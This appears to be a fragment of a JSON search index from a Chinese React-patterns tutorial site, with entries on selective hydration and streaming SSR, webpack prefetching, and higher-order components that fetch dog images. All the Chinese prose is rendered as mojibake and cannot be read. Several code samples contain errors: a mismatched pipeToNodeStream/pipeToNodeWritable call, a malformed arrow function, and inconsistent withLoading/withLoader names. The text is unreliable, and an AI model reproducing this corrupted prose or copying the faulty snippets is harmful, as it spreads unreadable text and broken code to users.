åº“æä¾›çš„ renderToString æ–¹æ³•åœ¨æœåŠ¡å™¨ä¸Šç”Ÿæˆä¸€æ£µæ ‘ï¼Œè¯¥æ–¹æ³•åœ¨æ•´ä¸ªæ ‘ç”Ÿæˆåå‘é€åˆ°å®¢æˆ·ç«¯ã€‚\næ¸²æŸ“çš„ HTML æ˜¯éäº¤äº’å¼çš„ï¼Œç›´åˆ° JavaScript åŒ…è¢«è·å–å’ŒåŠ è½½ï¼Œä¹‹å React æ²¿ç€æ ‘å‘ä¸‹èµ°ä»¥è·å–å’Œé™„åŠ å¤„ç†ç¨‹åºã€‚\nä½†æ˜¯ï¼Œç”±äºå½“å‰å®ç°çš„ä¸€äº›é™åˆ¶ï¼Œè¿™ç§æ–¹æ³•å¯èƒ½ä¼šå¯¼è‡´ä¸€äº›æ€§èƒ½é—®é¢˜ã€‚\nåœ¨æœåŠ¡å™¨æ¸²æŸ“çš„ HTML æ ‘èƒ½å¤Ÿå‘é€åˆ°å®¢æˆ·ç«¯ä¹‹å‰ï¼Œæ‰€æœ‰ç»„ä»¶éƒ½éœ€è¦å‡†å¤‡å¥½ã€‚\nè¿™æ„å‘³ç€å¯èƒ½ä¾èµ–å¤–éƒ¨ API è°ƒç”¨æˆ–ä»»ä½•å¯èƒ½å¯¼è‡´æŸäº›å»¶è¿Ÿçš„è¿›ç¨‹çš„ç»„ä»¶æœ€ç»ˆå¯èƒ½ä¼šé˜»æ­¢è¾ƒå°çš„ç»„ä»¶å¿«é€Ÿå‘ˆç°ã€‚\né™¤äº†è¾ƒæ…¢çš„æ ‘ç”Ÿæˆä¹‹å¤–ï¼Œå¦ä¸€ä¸ªé—®é¢˜æ˜¯ React åªå¯¹æ ‘è¿›è¡Œä¸€æ¬¡æ°´åˆã€‚\nè¿™æ„å‘³ç€åœ¨ React èƒ½å¤Ÿå¯¹ä»»ä½•ç»„ä»¶è¿›è¡Œæ°´åˆä¹‹å‰ï¼Œå®ƒéœ€è¦å…ˆè·å–æ‰€æœ‰ç»„ä»¶çš„ JavaScriptï¼Œç„¶åæ‰èƒ½å¯¹ä»»ä½•ç»„ä»¶è¿›è¡Œæ°´åˆã€‚\nè¿™æ„å‘³ç€è¾ƒå°çš„ç»„ä»¶ï¼ˆå¸¦æœ‰è¾ƒå°çš„åŒ…ï¼‰å¿…é¡»ç­‰å¾…è¾ƒå¤§ç»„ä»¶çš„ä»£ç è¢«è·å–å’ŒåŠ è½½ï¼Œç›´åˆ° React èƒ½å¤Ÿåœ¨æ‚¨çš„ç½‘ç«™ä¸Šå¤„ç†ä»»ä½•å†…å®¹ã€‚åœ¨æ­¤æœŸé—´ï¼Œè¯¥ç½‘ç«™ä¿æŒéäº’åŠ¨çŠ¶æ€ã€‚\n\rReact 18 é€šè¿‡å…è®¸å°†æµå¼æœåŠ¡å™¨ç«¯æ¸²æŸ“ä¸ä¸€ç§æ–°çš„æ°´åŒ–æ–¹æ³•ç›¸ç»“åˆæ¥è§£å†³è¿™äº›é—®é¢˜ï¼šé€‰æ‹©æ€§æ°´åŒ–ï¼\næˆ‘ä»¬ç°åœ¨å¯ä»¥ä½¿ç”¨æœåŠ¡å™¨ä¸Šçš„æ–° pipeToNodeStream æ–¹æ³•æµå¼æ¸²æŸ“ HTMLï¼Œè€Œä¸æ˜¯ä½¿ç”¨æˆ‘ä»¬ä¹‹å‰ä»‹ç»çš„ renderToString æ–¹æ³•ã€‚\næ­¤æ–¹æ³•ä¸ createRoot æ–¹æ³•å’Œ Suspense ç›¸ç»“åˆï¼Œå¯ä»¥å¼€å§‹æµå¼ä¼ è¾“ HTMLï¼Œè€Œæ— éœ€ç­‰å¾…è¾ƒå¤§çš„ç»„ä»¶å‡†å¤‡å°±ç»ªã€‚\nè¿™æ„å‘³ç€å¯ä»¥åœ¨ä½¿ç”¨ SSR æ—¶å»¶è¿ŸåŠ è½½ç»„ä»¶ï¼Œè¿™åœ¨ä»¥å‰ï¼ˆçœŸçš„ï¼‰æ˜¯ä¸å¯èƒ½çš„ï¼\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44  // index.js import { hydrateRoot } from \u0026#34;react-dom\u0026#34;; import App from \u0026#39;./App\u0026#39;; hydrateRoot(document, \u0026lt;App /\u0026gt;); // App.js import { Suspense, lazy } from \u0026#34;react\u0026#34;; import Loader from \u0026#34;./Loader\u0026#34;; const Comments = lazy(() =\u0026gt; import(\u0026#34;./Comments\u0026#34;)); function App() { return ( \u0026lt;main\u0026gt; \u0026lt;Header /\u0026gt; \u0026lt;Suspense fallback={\u0026lt;Loader /\u0026gt;}\u0026gt; \u0026lt;Comments /\u0026gt; \u0026lt;/Suspense\u0026gt; \u0026lt;Footer /\u0026gt; \u0026lt;/main\u0026gt; ) } // server.js import { pipeToNodeStream} from \u0026#34;react-dom/server\u0026#34;; export function render(res) { const data = createServerData(); const { startWriting, abort } = pipeToNodeWritable( \u0026lt;DataProvider data={data}\u0026gt; \u0026lt;App assets={assets} /\u0026gt; \u0026lt;/DataProvider\u0026gt;, res, { onReadyToStream() { res.setHeader(\u0026#39;Content-type\u0026#39;, \u0026#39;text/html\u0026#39;); res.write(\u0026#39;\u0026lt;!DOCTYPE html\u0026gt;\u0026#39;); startWriting(); } } ); };   ä¹‹å‰å‡ç¼“äº†æ ‘ç”Ÿæˆå’Œ TTI çš„ Comments ç»„ä»¶ç°åœ¨åŒ…å«åœ¨ Suspense ä¸­ã€‚\nè¿™å‘Šè¯‰ React ä¸è¦è®©è¿™ä¸ªç»„ä»¶å‡æ…¢æ ‘ç”Ÿæˆçš„å…¶ä½™éƒ¨åˆ†ã€‚\nç›¸åï¼ŒReact å°†å›é€€ç»„ä»¶ä½œä¸ºæœ€åˆå‘ˆç°çš„ HTML æ’å…¥ï¼Œå¹¶åœ¨å‘é€åˆ°å®¢æˆ·ç«¯ä¹‹å‰ç»§ç»­ç”Ÿæˆæ ‘çš„å…¶ä½™éƒ¨åˆ†ã€‚\n\rä¸æ­¤åŒæ—¶ï¼Œæˆ‘ä»¬ä»åœ¨è·å– Comments ç»„ä»¶æ‰€éœ€çš„å¤–éƒ¨æ•°æ®ã€‚\né€‰æ‹©æ€§æ°´åˆä½¿å¾—å·²ç»å¯ä»¥å¯¹å‘é€åˆ°å®¢æˆ·ç«¯çš„ç»„ä»¶è¿›è¡Œæ°´åˆï¼Œç”šè‡³åœ¨å‘é€ Comments ç»„ä»¶ä¹‹å‰ï¼\n\rä¸€æ—¦ Comments ç»„ä»¶çš„æ•°æ®å‡†å¤‡å¥½ï¼ŒReact å¼€å§‹æµå¼ä¼ è¾“è¯¥ç»„ä»¶çš„ HTMLï¼Œä»¥åŠä¸€ä¸ªå°çš„ \u0026lt;script\u0026gt; æ¥æ›¿æ¢å›é€€åŠ è½½å™¨ã€‚\nReact åœ¨æ³¨å…¥æ–°çš„ HTML åå¼€å§‹æ°´åŒ–ã€‚\n\rReact 18 ä¿®å¤äº†äººä»¬åœ¨å°† SSR ä¸ React ä¸€èµ·ä½¿ç”¨æ—¶ç»å¸¸é‡åˆ°çš„ä¸€äº›é—®é¢˜ã€‚\næµå¼æ¸²æŸ“å…è®¸æ‚¨åœ¨ç»„ä»¶å‡†å¤‡å¥½åç«‹å³å¼€å§‹æµå¼ä¼ è¾“ï¼Œè€Œä¸ä¼šå› ä¸ºç»„ä»¶å¯èƒ½éœ€è¦æ›´é•¿çš„æ—¶é—´åœ¨æœåŠ¡å™¨ä¸Šç”Ÿæˆè€Œå¯¼è‡´ FCP å’Œ TTI å˜æ…¢ã€‚\nç»„ä»¶å¯ä»¥åœ¨æµå¼ä¼ è¾“åˆ°å®¢æˆ·ç«¯åç«‹å³åŠ æ°´ï¼Œå› ä¸ºæˆ‘ä»¬ä¸å†éœ€è¦ç­‰å¾…æ‰€æœ‰ JavaScript åŠ è½½å¼€å§‹åŠ æ°´ï¼Œå¹¶ä¸”å¯ä»¥åœ¨æ‰€æœ‰ç»„ä»¶éƒ½åŠ æ°´ä¹‹å‰å¼€å§‹ä¸åº”ç”¨ç¨‹åºäº¤äº’ã€‚\n\r\rçŸ¥è¯†ç‚¹   pipeToNodeStream\n  Suspense\n  ","description":"å¦‚ä½•å°†æµæœåŠ¡å™¨ç«¯æ¸²æŸ“ä¸æ–°çš„æ°´åŒ–æ–¹æ³•ç»“åˆä½¿ç”¨ï¼Œé€‰æ‹©æ€§æ°´åŒ–","id":124,"section":"react-patterns","tags":null,"title":"é€‰æ‹©æ€§æ°´åˆä½œç”¨ âœ”","uri":"https://codthing.github.io/react-patterns/render-patterns/react-selective-hydration/"},{"content":"Prefetch (\u0026lt;link rel=\u0026quot;prefetch\u0026quot;\u0026gt;) æ˜¯ä¸€ç§æµè§ˆå™¨ä¼˜åŒ–ï¼Œå®ƒå…è®¸æˆ‘ä»¬åœ¨éœ€è¦ä¹‹å‰è·å–åç»­è·¯ç”±æˆ–é¡µé¢å¯èƒ½éœ€è¦çš„èµ„æºã€‚\né¢„å–å¯ä»¥é€šè¿‡å‡ ç§æ–¹å¼å®ç°ã€‚\nå®ƒå¯ä»¥åœ¨ HTML ä¸­å£°æ˜æ€§åœ°å®Œæˆï¼ˆä¾‹å¦‚åœ¨ä¸‹é¢çš„ç¤ºä¾‹ä¸­ï¼‰ï¼Œ\né€šè¿‡ HTTP æ ‡å¤´ï¼ˆé“¾æ¥ï¼š\u0026lt;/js/chat-widget.js\u0026gt;; rel=prefetchï¼‰ï¼Œ\nService Workers æˆ–é€šè¿‡æ›´å¤šè‡ªå®šä¹‰æ–¹å¼ï¼Œä¾‹å¦‚é€šè¿‡ Webpack .\n\u0026lt;link rel=\u0026#34;prefetch\u0026#34; href=\u0026#34;/pages/next-page.html\u0026#34;\u0026gt;\r\u0026lt;link rel=\u0026#34;prefetch\u0026#34; href=\u0026#34;/js/emoji-picker.js\u0026#34;\u0026gt; \rPrefetch é¢„å– åœ¨å±•ç¤ºå¦‚ä½•æ ¹æ®å¯è§æ€§æˆ–äº¤äº’å¯¼å…¥æ¨¡å—çš„ç¤ºä¾‹ä¸­ï¼Œ\næˆ‘ä»¬çœ‹åˆ°åœ¨å•å‡»æŒ‰é’®ä»¥åˆ‡æ¢ç»„ä»¶ä¸åœ¨å±å¹•ä¸Šæ˜¾ç¤ºå®é™…ç»„ä»¶ä¹‹é—´é€šå¸¸å­˜åœ¨ä¸€äº›å»¶è¿Ÿã€‚\nå‘ç”Ÿäº†è¿™ç§æƒ…å†µï¼Œå› ä¸ºå½“ç”¨æˆ·å•å‡»æŒ‰é’®æ—¶ï¼Œæ¨¡å—ä»ç„¶éœ€è¦è¢«è¯·æ±‚å’ŒåŠ è½½ï¼\nåœ¨è®¸å¤šæƒ…å†µä¸‹ï¼Œæˆ‘ä»¬çŸ¥é“ç”¨æˆ·ä¼šåœ¨é¡µé¢åˆå§‹å‘ˆç°åä¸ä¹…è¯·æ±‚æŸäº›èµ„æºã€‚ å°½ç®¡å®ƒä»¬å¯èƒ½ä¸ä¼šç«‹å³å¯è§ï¼Œå› æ­¤ä¸åº”åŒ…å«åœ¨åˆå§‹åŒ…ä¸­ï¼Œä½†å°½å¯èƒ½å‡å°‘åŠ è½½æ—¶é—´ä»¥æä¾›æ›´å¥½çš„ç”¨æˆ·ä½“éªŒä¼šå¾ˆæ£’ï¼\nå¯èƒ½åœ¨åº”ç”¨ç¨‹åºä¸­çš„æŸä¸ªæ—¶åˆ»ä½¿ç”¨çš„ç»„ä»¶æˆ–èµ„æºå¯ä»¥è¢«é¢„å–ã€‚ å¯ä»¥é€šè¿‡åœ¨ import è¯­å¥ä¸­æ·»åŠ ä¸€ä¸ªç¥å¥‡çš„æ³¨é‡Šæ¥è®© Webpack çŸ¥é“æŸäº›åŒ…éœ€è¦é¢„å–ï¼š/* webpackPrefetch: true */ã€‚\nconst EmojiPicker = import(/* webpackPrefetch: true */ \u0026#34;./EmojiPicker\u0026#34;); æ„å»ºåº”ç”¨ç¨‹åºåï¼Œå¯ä»¥çœ‹åˆ° EmojiPicker å°†è¢«é¢„å–ã€‚\nAsset Size Chunks Chunk Names\remoji-picker.bundle.js 1.49 KiB emoji-picker [emitted] emoji-picker\rvendors~emoji-picker.bundle.js 171 KiB vendors~emoji-picker [emitted] vendors~emoji-picker\rmain.bundle.js 1.34 MiB main [emitted] main\rEntrypoint main = main.bundle.js\r(prefetch: vendors~emoji-picker.bundle.js emoji-picker.bundle.js) å®é™…è¾“å‡ºä½œä¸ºé“¾æ¥æ ‡ç­¾å¯è§ï¼Œåœ¨æ–‡æ¡£å¤´éƒ¨å¸¦æœ‰ rel=\u0026quot;prefetch\u0026quot;ã€‚\n\u0026lt;link rel=\u0026#34;prefetch\u0026#34; href=\u0026#34;emoji-picker.bundle.js\u0026#34; as=\u0026#34;script\u0026#34; /\u0026gt;\r\u0026lt;link rel=\u0026#34;prefetch\u0026#34; href=\u0026#34;vendors~emoji-picker.bundle.js\u0026#34; as=\u0026#34;script\u0026#34; /\u0026gt; ç”šè‡³åœ¨ç”¨æˆ·è¯·æ±‚èµ„æºä¹‹å‰ï¼Œæµè§ˆå™¨å°±ä¼šè¯·æ±‚å’ŒåŠ è½½é¢„å–çš„æ¨¡å—ã€‚ å½“æµè§ˆå™¨ç©ºé—²å¹¶è®¡ç®—å‡ºå®ƒæœ‰è¶³å¤Ÿçš„å¸¦å®½æ—¶ï¼Œå®ƒä¼šå‘å‡ºè¯·æ±‚ä»¥åŠ è½½èµ„æºï¼Œå¹¶ç¼“å­˜å®ƒã€‚ ç¼“å­˜èµ„æºå¯ä»¥æ˜¾ç€å‡å°‘åŠ è½½æ—¶é—´ï¼Œå› ä¸ºä¸å¿…åœ¨ç”¨æˆ·å•å‡»æŒ‰é’®åç­‰å¾…è¯·æ±‚å®Œæˆã€‚ å®ƒå¯ä»¥ç®€å•åœ°ä»ç¼“å­˜ä¸­è·å–åŠ è½½çš„èµ„æºã€‚\nå°½ç®¡é¢„å–æ˜¯ä¼˜åŒ–åŠ è½½æ—¶é—´çš„å¥½æ–¹æ³•ï¼Œä½†ä¸è¦è¿‡åº¦ä½¿ç”¨ã€‚\nå¦‚æœç”¨æˆ·æœ€ç»ˆä»æœªè¯·æ±‚è¿‡ EmojiPicker ç»„ä»¶ï¼Œå°±ä¸å¿…è¦åœ°åŠ è½½äº†èµ„æºã€‚ è¿™å¯èƒ½ä¼šèŠ±è´¹ç”¨æˆ·èµ„é‡‘ï¼Œæˆ–å‡æ…¢åº”ç”¨ç¨‹åºçš„é€Ÿåº¦ã€‚ åªé¢„å–å¿…è¦çš„èµ„æºã€‚\næ‚¨å¯èƒ½ä¼šå‘ç°ä»¥ä¸‹æœ‰å…³é¢„å–çš„èµ„æºå¾ˆæœ‰å¸®åŠ©ï¼š\n  Chrome ä¸­çš„é¢„åŠ è½½ã€é¢„å–å’Œä¼˜å…ˆçº§\n  é€šè¿‡é¢„æµ‹æ€§é¢„å–å®ç°æ›´å¿«çš„å¯¼èˆª\n  é¢„å–å¯å‘å¼\n  ä»€ä¹ˆä¸èƒ½é¢„å–\n  \rçŸ¥è¯†ç‚¹  webpack  ","description":"è·å–å’Œç¼“å­˜å¯èƒ½å¾ˆå¿«ä¼šè¢«è¯·æ±‚çš„èµ„æº","id":125,"section":"react-patterns","tags":null,"title":"é¢„å–","uri":"https://codthing.github.io/react-patterns/performance-patterns/prefetch/"},{"content":"è¿™æ˜¯å†å²é—ç•™é—®é¢˜ï¼Œæ‰€ä»¥ä¸å»ºè®®ä½¿ç”¨ï¼ˆç°åœ¨æœ‰äº†Hooksï¼‰ï¼Œåœ¨è¿™é‡Œåªæ˜¯è®©æˆ‘ä»¬äº†è§£è¿™æ®µå†å²\nåœ¨æˆ‘ä»¬çš„åº”ç”¨ç¨‹åºä¸­ï¼Œæˆ‘ä»¬ç»å¸¸å¸Œæœ›åœ¨å¤šä¸ªç»„ä»¶ä¸­ä½¿ç”¨ç›¸åŒçš„é€»è¾‘ã€‚æ­¤é€»è¾‘å¯ä»¥åŒ…æ‹¬å°†ç‰¹å®šæ ·å¼åº”ç”¨äºç»„ä»¶ã€è¦æ±‚æˆæƒæˆ–æ·»åŠ å…¨å±€çŠ¶æ€ã€‚\nèƒ½å¤Ÿåœ¨å¤šä¸ªç»„ä»¶ä¸­é‡ç”¨ç›¸åŒé€»è¾‘çš„ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨é«˜é˜¶ç»„ä»¶æ¨¡å¼ã€‚è¿™ç§æ¨¡å¼å…è®¸æˆ‘ä»¬åœ¨æ•´ä¸ªåº”ç”¨ç¨‹åºä¸­é‡ç”¨ç»„ä»¶é€»è¾‘ã€‚\né«˜é˜¶ç»„ä»¶ (HOC) æ˜¯æ¥æ”¶å¦ä¸€ä¸ªç»„ä»¶çš„ç»„ä»¶ã€‚HOC åŒ…å«æˆ‘ä»¬æƒ³è¦åº”ç”¨äºä½œä¸ºå‚æ•°ä¼ é€’çš„ç»„ä»¶çš„æŸäº›é€»è¾‘ã€‚åº”ç”¨è¯¥é€»è¾‘åï¼ŒHOC è¿”å›å¸¦æœ‰é™„åŠ é€»è¾‘çš„å…ƒç´ ã€‚\n\rå®¹å™¨/å±•ç¤º æ¨¡å¼ å‡è®¾æˆ‘ä»¬ä¸€ç›´æƒ³ä¸ºåº”ç”¨ç¨‹åºä¸­çš„å¤šä¸ªç»„ä»¶æ·»åŠ æŸç§æ ·å¼ã€‚ä¸æ˜¯styleæ¯æ¬¡éƒ½åœ¨æœ¬åœ°åˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œæˆ‘ä»¬å¯ä»¥ç®€å•åœ°åˆ›å»ºä¸€ä¸ª HOCï¼Œå°†styleå¯¹è±¡æ·»åŠ åˆ°æˆ‘ä»¬ä¼ é€’ç»™å®ƒçš„ç»„ä»¶ä¸­\nfunction withStyles(Component) {\rreturn props =\u0026gt; {\rconst style = { padding: \u0026#39;0.2rem\u0026#39;, margin: \u0026#39;1rem\u0026#39; }\rreturn \u0026lt;Component style={style} {...props} /\u0026gt;\r}\r}\rconst Button = () = \u0026lt;button\u0026gt;Click me!\u0026lt;/button\u0026gt;\rconst Text = () =\u0026gt; \u0026lt;p\u0026gt;Hello World!\u0026lt;/p\u0026gt;\rconst StyledButton = withStyles(Button)\rconst StyedText = withStyles(Text) æˆ‘ä»¬åˆšåˆšåˆ›å»ºäº†ä¸€ä¸ª StyledButton å’Œ StyledText ç»„ä»¶ï¼Œå®ƒä»¬æ˜¯ Button å’Œ Text ç»„ä»¶çš„ä¿®æ”¹ç‰ˆæœ¬ã€‚å®ƒä»¬ç°åœ¨éƒ½åŒ…å«åœ¨ withStyles HOC ä¸­æ·»åŠ çš„æ ·å¼ï¼\nè®©æˆ‘ä»¬çœ‹ä¸€ä¸‹ä¹‹å‰åœ¨ Container/Presentational æ¨¡å¼ä¸­ä½¿ç”¨çš„åŒä¸€ä¸ª DogImages ç¤ºä¾‹ï¼è¯¥åº”ç”¨ç¨‹åºä»…æ¸²æŸ“ä» API è·å–çš„ç‹—å›¾åƒåˆ—è¡¨ã€‚\nHOC æ¨¡å¼ è®©æˆ‘ä»¬ç¨å¾®æ”¹å–„ä¸€ä¸‹ç”¨æˆ·ä½“éªŒã€‚ å½“æˆ‘ä»¬è·å–æ•°æ®æ—¶ï¼Œæˆ‘ä»¬å¸Œæœ›å‘ç”¨æˆ·æ˜¾ç¤ºâ€œæ­£åœ¨åŠ è½½\u0026hellip;â€å±å¹•ã€‚ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨é«˜é˜¶ç»„ä»¶ä¸ºæˆ‘ä»¬æ·»åŠ æ­¤é€»è¾‘ï¼Œè€Œä¸æ˜¯ç›´æ¥å‘ DogImages ç»„ä»¶æ·»åŠ æ•°æ®ã€‚\nè®©æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªåä¸º withLoader çš„ HOCã€‚ HOC åº”è¯¥æ¥æ”¶ä¸€ä¸ªç»„ä»¶ï¼Œå¹¶è¿”å›è¯¥ç»„ä»¶ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒwithLoader HOC åº”è¯¥æ¥æ”¶åº”è¯¥æ˜¾ç¤º Loading\u0026hellip; çš„å…ƒç´ ï¼Œç›´åˆ°è·å–æ•°æ®ã€‚\nè®©æˆ‘ä»¬åˆ›å»ºæˆ‘ä»¬æƒ³è¦ä½¿ç”¨çš„ withLoader HOC h çš„æœ€ä½ç‰ˆæœ¬ï¼\nfunction withLoader(Element) {\rreturn props =\u0026gt; \u0026lt;Element /\u0026gt;;\r} ç„¶è€Œï¼Œæˆ‘ä»¬ä¸åªæ˜¯æƒ³è¿”å›å®ƒæ”¶åˆ°çš„å…ƒç´ ã€‚ ç›¸åï¼Œæˆ‘ä»¬å¸Œæœ›è¿™ä¸ªå…ƒç´ åŒ…å«å‘Šè¯‰æˆ‘ä»¬æ•°æ®æ˜¯å¦ä»åœ¨åŠ è½½çš„é€»è¾‘ã€‚\nä¸ºäº†ä½¿ withLoader HOC éå¸¸å¯é‡ç”¨ï¼Œæˆ‘ä»¬ä¸ä¼šåœ¨è¯¥ç»„ä»¶ä¸­ç¡¬ç¼–ç  Dog API urlã€‚ ç›¸åï¼Œæˆ‘ä»¬å¯ä»¥å°† URL ä½œä¸ºå‚æ•°ä¼ é€’ç»™ withLoader HOCï¼Œå› æ­¤è¿™ä¸ªåŠ è½½å™¨å¯ä»¥ç”¨äºä»»ä½•éœ€è¦åŠ è½½æŒ‡ç¤ºå™¨çš„ç»„ä»¶ï¼ŒåŒæ—¶ä»ä¸åŒçš„ API ç«¯ç‚¹è·å–æ•°æ®ã€‚\nfunction withLoader(Element, url) {\rreturn props =\u0026gt; {};\r} ä¸€ä¸ª HOC è¿”å›ä¸€ä¸ªå…ƒç´ ï¼Œä¸€ä¸ªåŠŸèƒ½ç»„ä»¶ props =\u0026gt; {} æƒ³è¦æ·»åŠ é€»è¾‘ï¼Œå…è®¸æ˜¾ç¤ºå¸¦æœ‰ Loading\u0026hellip; çš„æ–‡æœ¬ï¼Œå› ä¸ºæ•°æ®ä»åœ¨è·å–ä¸­ã€‚ è·å–æ•°æ®åï¼Œç»„ä»¶åº”å°†è·å–çš„æ•°æ®ä½œä¸º prop ä¼ é€’ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  //DogImages.js import React from \u0026#34;react\u0026#34;; import withLoader from \u0026#34;./withLoader\u0026#34;; function DogImages(props) { return props.data.message.map((dog, index) =\u0026gt; ( \u0026lt;img src={dog} alt=\u0026#34;Dog\u0026#34; key={index} /\u0026gt; )); } export default withLoader( DogImages, \u0026#34;https://dog.ceo/api/breed/labrador/images/random/6\u0026#34; );   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  //withLoader.js import React, { useEffect, useState } from \u0026#34;react\u0026#34;; export default function withLoader(Element, url) { return (props) =\u0026gt; { const [data, setData] = useState(null); useEffect(() =\u0026gt; { async function getData() { const res = await fetch(url); const data = await res.json(); setData(data); } getData(); }, []); if (!data) { return \u0026lt;div\u0026gt;Loading...\u0026lt;/div\u0026gt;; } return \u0026lt;Element {...props} data={data} /\u0026gt;; }; }   Perfectï¼ å®Œç¾çš„ï¼ æˆ‘ä»¬åˆšåˆšåˆ›å»ºäº†ä¸€ä¸ªå¯ä»¥æ¥æ”¶ä»»ä½•ç»„ä»¶å’Œ url çš„ HOCã€‚\n  åœ¨ useEffect é’©å­ä¸­ï¼ŒwithLoader HOC ä»æˆ‘ä»¬ä½œä¸º url å€¼ä¼ é€’çš„ API ç«¯ç‚¹è·å–æ•°æ®ã€‚ è™½ç„¶æ•°æ®å°šæœªè¿”å›ï¼Œä½†æˆ‘ä»¬è¿”å›åŒ…å« Loading\u0026hellip; æ–‡æœ¬çš„å…ƒç´ ã€‚\n  è·å–æ•°æ®åï¼Œæˆ‘ä»¬å°† data è®¾ç½®ä¸ºç­‰äºå·²è·å–çš„æ•°æ®ã€‚ ç”±äºæ•°æ®ä¸å†ä¸ºç©ºï¼Œæˆ‘ä»¬å¯ä»¥æ˜¾ç¤ºæˆ‘ä»¬ä¼ é€’ç»™ HOC çš„å…ƒç´ ï¼\n  é‚£ä¹ˆï¼Œæˆ‘ä»¬å¦‚ä½•å°†è¿™ç§è¡Œä¸ºæ·»åŠ åˆ°æˆ‘ä»¬çš„åº”ç”¨ç¨‹åºä¸­ï¼Œä»¥ä¾¿å®ƒå®é™…ä¸Šä¼šåœ¨ DogImages åˆ—è¡¨ä¸Šæ˜¾ç¤º Loading\u0026hellip; æŒ‡ç¤ºå™¨ï¼Ÿ\nåœ¨ DogImages.js ä¸­ï¼Œæˆ‘ä»¬ä¸å†åªæƒ³å¯¼å‡ºæ™®é€šçš„ DogImages ç»„ä»¶ã€‚ ç›¸åï¼Œæˆ‘ä»¬å¸Œæœ›å›´ç»• DogImages ç»„ä»¶å¯¼å‡ºâ€œåŒ…è£…çš„â€ withLoading HOCã€‚\nexport default withLoading(DogImages); withLoading HOC è¿˜å¸Œæœ› url çŸ¥é“ä»å“ªä¸ªç«¯ç‚¹è·å–æ•°æ®ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬è¦æ·»åŠ  Dog API ç«¯ç‚¹ã€‚\nexport default withLoader(\rDogImages,\r\u0026#34;https://dog.ceo/api/breed/labrador/images/random/6\u0026#34;\r); ç”±äº withLoader HOC è¿”å›äº†å¸¦æœ‰é¢å¤–æ•°æ®é“å…·çš„å…ƒç´ ï¼Œåœ¨æœ¬ä¾‹ä¸­ä¸º DogImagesï¼Œæˆ‘ä»¬å¯ä»¥è®¿é—® DogImages ç»„ä»¶ä¸­çš„æ•°æ®é“å…·ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  //DogImages.js import React from \u0026#34;react\u0026#34;; import withLoader from \u0026#34;./withLoader\u0026#34;; function DogImages(props) { return props.data.message.map((dog, index) =\u0026gt; ( \u0026lt;img src={dog} alt=\u0026#34;Dog\u0026#34; key={index} /\u0026gt; )); } export default withLoader( DogImages, \u0026#34;https://dog.ceo/api/breed/labrador/images/random/6\u0026#34; );   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  //withLoader.js import React, { useEffect, useState } from \u0026#34;react\u0026#34;; export default function withLoader(Element, url) { return (props) =\u0026gt; { const [data, setData] = useState(null); useEffect(() =\u0026gt; { async function getData() { const res = await fetch(url); const data = await res.json(); setData(data); } getData(); }, []); if (!data) { return \u0026lt;div\u0026gt;Loading...\u0026lt;/div\u0026gt;; } return \u0026lt;Element {...props} data={data} /\u0026gt;; }; }   Perfectï¼ æˆ‘ä»¬ç°åœ¨åœ¨è·å–æ•°æ®æ—¶çœ‹åˆ°ä¸€ä¸ª Loading\u0026hellip; å±å¹•ã€‚\né«˜é˜¶ç»„ä»¶æ¨¡å¼å…è®¸æˆ‘ä»¬ä¸ºå¤šä¸ªç»„ä»¶æä¾›ç›¸åŒçš„é€»è¾‘ï¼ŒåŒæ—¶å°†æ‰€æœ‰é€»è¾‘ä¿å­˜åœ¨ä¸€ä¸ªåœ°æ–¹ã€‚\nwithLoader HOC ä¸å…³å¿ƒå®ƒæ¥æ”¶åˆ°çš„ç»„ä»¶æˆ– urlï¼šåªè¦å®ƒæ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„ç»„ä»¶å’Œä¸€ä¸ªæœ‰æ•ˆçš„ API ç«¯ç‚¹ï¼Œå®ƒå°±ä¼šç®€å•åœ°å°†æ•°æ®ä»è¯¥ API ç«¯ç‚¹ä¼ é€’ç»™æˆ‘ä»¬ä¼ é€’çš„ç»„ä»¶ã€‚\n\rç»„åˆ æˆ‘ä»¬è¿˜å¯ä»¥ç»„åˆå¤šä¸ªé«˜é˜¶ç»„ä»¶ã€‚\nå‡è®¾è¿˜æƒ³æ·»åŠ æ˜¾ç¤ºæ‚¬åœçš„åŠŸèƒ½ï¼ å½“ç”¨æˆ·å°†é¼ æ ‡æ‚¬åœåœ¨ DogImages åˆ—è¡¨ä¸Šæ—¶çš„æ–‡æœ¬æ¡†ã€‚\néœ€è¦åˆ›å»ºä¸€ä¸ª HOCï¼Œä¸ºä¼ é€’çš„å…ƒç´ æä¾›æ‚¬åœé“å…·ã€‚ åŸºäºè¯¥é“å…·ï¼Œå¯ä»¥æ ¹æ®ç”¨æˆ·æ˜¯å¦å°†é¼ æ ‡æ‚¬åœåœ¨ DogImages åˆ—è¡¨ä¸Šï¼Œæœ‰æ¡ä»¶åœ°å‘ˆç°æ–‡æœ¬æ¡†ã€‚\nç°åœ¨å¯ä»¥å°† withHover HOC åŒ…è£¹åœ¨ withLoader HOC å‘¨å›´ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  //DogImages.js import React from \u0026#34;react\u0026#34;; import withLoader from \u0026#34;./withLoader\u0026#34;; import withHover from \u0026#34;./withHover\u0026#34;; function DogImages(props) { return ( \u0026lt;div {...props}\u0026gt; {props.hovering \u0026amp;\u0026amp; \u0026lt;div id=\u0026#34;hover\u0026#34;\u0026gt;Hovering!\u0026lt;/div\u0026gt;} \u0026lt;div id=\u0026#34;list\u0026#34;\u0026gt; {props.data.message.map((dog, index) =\u0026gt; ( \u0026lt;img src={dog} alt=\u0026#34;Dog\u0026#34; key={index} /\u0026gt; ))} \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; ); } export default withHover( withLoader(DogImages, \u0026#34;https://dog.ceo/api/breed/labrador/images/random/6\u0026#34;) );   1 2 3 4 5 